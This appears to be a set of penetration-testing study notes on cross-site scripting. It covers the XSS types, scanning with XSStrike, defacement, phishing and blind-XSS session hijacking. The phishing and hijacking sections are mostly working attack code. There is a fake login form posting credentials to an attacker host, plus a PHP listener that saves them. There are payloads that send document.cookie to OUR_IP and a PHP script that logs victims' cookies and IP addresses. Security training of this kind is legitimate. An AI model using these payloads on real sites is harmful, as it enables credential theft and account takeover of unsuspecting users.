A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (low impact + high probability = medium risk), which we should always attempt to reduce risk by detecting, remediating, and proactively preventing these types of vulnerabilities.


There are three main types of XSS vulnerabilities:
- **Stored (Persistent) XSS**: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
- **Reflected (Non-Persistent) XSS**:	Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)
- **DOM-based XSS**: Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)

# Stored XSS

The first and most critical type of XSS vulnerability is Stored XSS or Persistent XSS. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

- **<script>alert(window.origin)</script>**

As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.

# Reflected XSS

There are two types of Non-Persistent XSS vulnerabilities: Reflected XSS, which gets processed by the back-end server, and DOM-based XSS, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, Non-Persistent XSS vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.

Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.

# DOM XSS

The third and final type of XSS is another Non-Persistent type called DOM-based XSS. While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).


To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field.

On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:
- document.write();
- DOM.innerHTML;
- DOM.outerHTML.

Furthermore, some of the jQuery library functions that write to DOM objects are:
- add();
- after();
- append().

If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <script> tags, like the following XSS payload:

- **<img src="" onerror=alert(window.origin)>**

# XSS discovery

Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually do two types of scanning: A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities, and an Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.

We can use XSS Strike which is an open source tool for discovering XSS vulnerabilities.

- **python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"**

## Manual discovery
The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page.

**Note**: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.

# Defacing attack

Defacing a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it, like when hackers defaced the UK National Health Service (NHS) back in 2018. Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.
We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
- Background Color document.body.style.background;
- Background document.body.background;
- Page Title document.title;
- Page Text DOM.innerHTML.

# Phishing

Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Example of JS malicious code:

- **document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');**

We need to set a listener to steal credentials (example in php code):

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

We can start this index.php with something like that:
- mkdir /tmp/tmpserver;
- cd /tmp/tmpserver;
- Put our index.php inside this directory;
- sudo php -S 0.0.0.0:80.

# Session hijacking

Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack.

## Blind XSS
A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms;
- Reviews;
- User Details;
- Support Tickets;
- HTTP User-Agent header.


Let's imagine a situation in which there is a form page where some of our data is requested in order to register.
Once we have entered our data we are informed that our request will be viewed by an admin to be approved.

Clearly, with the fact that any JS is not executed directly, we are faced with blind XSS and we must understand if the page is vulnerable to an XSS.

To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

However, this introduces two issues:

- How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
- How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?

## Loading a remote script

In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:

- **<script src="http://OUR_IP/script.js"></script>**

So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:

- **<script src="http://OUR_IP/username"></script>**

If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request.


Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings:
- **document.location='http://OUR_IP/index.php?c='+document.cookie;**
- **new Image().src='http://OUR_IP/index.php?c='+document.cookie;**


We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
- **new Image().src='http://OUR_IP/index.php?c='+document.cookie**

Now, we can change the URL in the XSS payload we found earlier to use script.js:
- **<script src=http://OUR_IP/script.js></script>**

With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

Example of index.php to steal cookies:

```

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
